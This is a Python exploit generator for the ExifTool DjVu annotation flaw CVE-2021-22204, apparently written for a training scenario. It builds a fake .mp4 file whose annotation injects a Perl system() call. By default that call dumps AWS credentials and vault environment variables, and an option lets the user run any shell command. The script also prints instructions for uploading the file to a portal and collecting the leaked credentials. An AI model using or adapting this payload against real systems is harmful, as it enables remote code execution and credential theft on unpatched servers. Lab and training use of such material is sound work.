#!/usr/bin/env python3
"""
CVE-2021-22204 payload generator for the Hidden Track scenario.

Creates a DjVu file (saved as malicious.mp4) containing an ANTa annotation
chunk with a Perl eval payload. When ExifTool < 12.24 processes this file,
ParseAnt() eval()s the annotation value, executing the injected Perl code.

The payload writes Lambda environment variables (AWS credentials + vault bucket)
to /tmp/exif_rce.txt, which the Lambda handler reads and includes in the response.

Usage:
    python3 generate_payload.py --output malicious.mp4

    # Custom command (advanced):
    python3 generate_payload.py --cmd "id > /tmp/exif_rce.txt" --output test.mp4
"""
import argparse
import struct
import sys


# ── DjVu IFF helpers ─────────────────────────────────────────────────────────

def _pack_chunk(chunk_id: bytes, data: bytes) -> bytes:
    """IFF chunk: 4-byte ID + 4-byte big-endian size + data (padded to even)."""
    size = len(data)
    chunk = chunk_id + struct.pack('>I', size) + data
    if size % 2:
        chunk += b'\x00'
    return chunk


def _pack_form(form_type: bytes, chunks: list[bytes]) -> bytes:
    """IFF FORM: AT&TFORM + 4-byte size + 4-byte type + chunks."""
    body = form_type + b''.join(chunks)
    return b'AT&TFORM' + struct.pack('>I', len(body)) + body


# ── Exploit payload builder ───────────────────────────────────────────────────

def build_djvu_exploit(shell_cmd: str) -> bytes:
    """
    Build a minimal DjVu FORM containing:
      INFO  — required page info chunk (1×1 px, 100 dpi)
      ANTa  — uncompressed annotation with eval-triggering payload

    ExifTool's ParseAnt() reaches eval() on the annotation value.
    The escape sequence \\c${...} causes Perl to evaluate the embedded
    expression, executing arbitrary code.

    Shell command is wrapped in Perl's q() quoting operator to avoid
    quote conflicts inside the DjVu string literal.
    """
    # INFO chunk: width(2) height(2) version(2) dpi(2) gamma(1) flags(1)
    info_data  = struct.pack('>HHHH', 1, 1, 26, 100) + bytes([44, 0])
    info_chunk = _pack_chunk(b'INFO', info_data)

    # Annotation: wrap command in Perl q() to avoid quote escaping issues
    perl_expr  = f'system(q({shell_cmd}))'
    annotation = f'(metadata "\\c${{{perl_expr}}};")'.encode('utf-8') + b'\n'
    anta_chunk = _pack_chunk(b'ANTa', annotation)

    return _pack_form(b'DJVU', [info_chunk, anta_chunk])


# ── Default command ───────────────────────────────────────────────────────────

DEFAULT_CMD = (
    "env | grep -E 'AWS_|VAULT_|UPLOADS_' > /tmp/exif_rce.txt"
)

# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2021-22204 payload generator for the Hidden Track scenario'
    )
    parser.add_argument(
        '--output', '-o',
        default='malicious.mp4',
        help='Output file path (default: malicious.mp4)'
    )
    parser.add_argument(
        '--cmd',
        default=DEFAULT_CMD,
        help='Shell command to execute inside Lambda (default writes env to /tmp/exif_rce.txt)'
    )
    parser.add_argument(
        '--show-annotation',
        action='store_true',
        help='Print the raw DjVu annotation before building the file'
    )
    args = parser.parse_args()

    if args.show_annotation:
        perl_expr  = f'system(q({args.cmd}))'
        annotation = f'(metadata "\\c${{{perl_expr}}};")'
        print(f'[*] DjVu annotation:\n    {annotation}\n')

    payload = build_djvu_exploit(args.cmd)

    with open(args.output, 'wb') as f:
        f.write(payload)

    print(f'[+] Payload written to: {args.output}')
    print(f'[+] File magic: AT&TFORM (DjVu) - ExifTool identifies by content, not extension')
    print(f'[+] Annotation type: ANTa (uncompressed) - no bzz compression needed')
    print(f'[+] Command: {args.cmd}')
    print()
    print('[*] Upload malicious.mp4 to the BeaverSound portal.')
    print('[*] Lambda will run ExifTool 12.23 → ParseAnt() evaluates the payload.')
    print('[*] AWS credentials appear in the portal response under "debug_output".')


if __name__ == '__main__':
    main()
